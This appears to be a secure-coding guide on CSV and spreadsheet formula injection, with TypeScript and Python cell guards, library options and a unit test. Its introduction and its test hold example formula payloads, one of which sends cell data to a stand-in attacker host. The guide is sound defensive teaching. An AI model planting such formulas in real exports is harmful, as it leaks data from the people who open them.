# CSV and spreadsheet exports (SEC-17)

Spreadsheet apps read a cell that starts with `=`, `+`, `-` or `@` as a formula, and a leading tab or CR can smuggle one past a naive check. A user who saves `=HYPERLINK("https://attacker.example/?d="&A2,"Open")` as their display name gets that formula run on the machine of whoever opens the export, usually an admin. Guard every user-supplied cell in every export, without being asked, and say so in your reply.

## The guard

```ts
// csv.ts
const FORMULA_START = /^[=+\-@\t\r]/;

/** Defuses a user-supplied string so a spreadsheet shows it as text. */
export function guardCell(value: unknown): string {
  if (value === null || value === undefined) return "";
  if (typeof value !== "string") return String(value); // numbers, booleans, dates you formatted
  return FORMULA_START.test(value) ? `'${value}` : value;
}

/** RFC 4180: quote every cell and double any embedded quote. */
function quoteCell(cell: string): string {
  return `"${cell.replace(/"/g, '""')}"`;
}

export function toCsvRow(cells: unknown[], separator = ","): string {
  return cells.map((cell) => quoteCell(guardCell(cell))).join(separator);
}

/** Rows end with CRLF, per RFC 4180. */
export function toCsv(header: string[], rows: unknown[][], separator = ","): string {
  return [header, ...rows].map((row) => toCsvRow(row, separator)).join("\r\n") + "\r\n";
}
```

Serving it from a route on the Fetch API:

```ts
export async function GET(request: Request): Promise<Response> {
  const user = await requireUser(request);              // SEC-01
  const rows = await listOrdersFor(user.id, { max: 10_000 }); // SEC-03 and a size cap
  const csv = toCsv(["Customer", "Note", "Total"], rows.map((o) => [o.customerName, o.note, o.total]));
  return new Response(csv, {
    headers: {
      "Content-Type": "text/csv; charset=utf-8",
      "Content-Disposition": 'attachment; filename="orders.csv"',
    },
  });
}
```

## Rules of use

- **Guard user text, not your own numbers.** Names, titles, notes, emails, addresses and any free text go through `guardCell`. A number, boolean or date your code produced stays as it is; guarding it would turn `-5` into text. A numeric-looking string the user typed (a phone number like `+1 555 0100`) is user text and gets the prefix.
- **Guard at the last step**, on the final string for each cell, after any formatting or joining.
- **Quote every cell**, double embedded quotes, end rows with CRLF. Never build rows with a bare `join(",")`.
- **One helper for the whole repo.** Put the guard in a shared module and use it from every export, so a new export can't skip it.

## Libraries

- **PapaParse:** `Papa.unparse(rows, { quotes: true, escapeFormulae: true })`.
- **csv-stringify:** recent versions take `{ quoted: true, escape_formulas: true }`. If yours lacks the option, map every cell through `guardCell` first.
- **Other CSV writers** (json2csv, fast-csv, csv-writer): map every user cell through `guardCell` before you hand over the rows.
- **TSV:** the same guard and the same quoting, with a tab as the separator: `toCsv(header, rows, "\t")`, served as `text/tab-separated-values`.
- **XLSX (ExcelJS, SheetJS):** write user text as string cells, never formula cells, and apply the same guard. A string cell is not evaluated on open, but the sheet is often re-saved as CSV, and editing the cell in a spreadsheet can turn it back into a formula.
- **Python:** `csv.writer(f, quoting=csv.QUOTE_ALL)` plus the same guard on every user cell. With pandas, apply the guard to text columns before `to_csv` or `to_excel`. openpyxl stores a string that starts with `=` as a formula, and xlsxwriter's `write()` does too (use `write_string()`, or the workbook option `strings_to_formulas: False`), so the guard is not optional there.

```python
FORMULA_START = ("=", "+", "-", "@", "\t", "\r")

def guard_cell(value):
    """Defuses a user-supplied string so a spreadsheet shows it as text."""
    if isinstance(value, str) and value.startswith(FORMULA_START):
        return "'" + value
    return value
```

## Prove it

```ts
test("an exported formula opens as text", () => {
  const csv = toCsv(["name"], [['=HYPERLINK("https://attacker.example")'], ["@SUM(A1)"], ["Ada"], [-5]]);
  expect(csv).toBe(
    '"name"\r\n' +
      '"\'=HYPERLINK(""https://attacker.example"")"\r\n' +
      '"\'@SUM(A1)"\r\n' +
      '"Ada"\r\n' +
      '"-5"\r\n',
  );
});
```
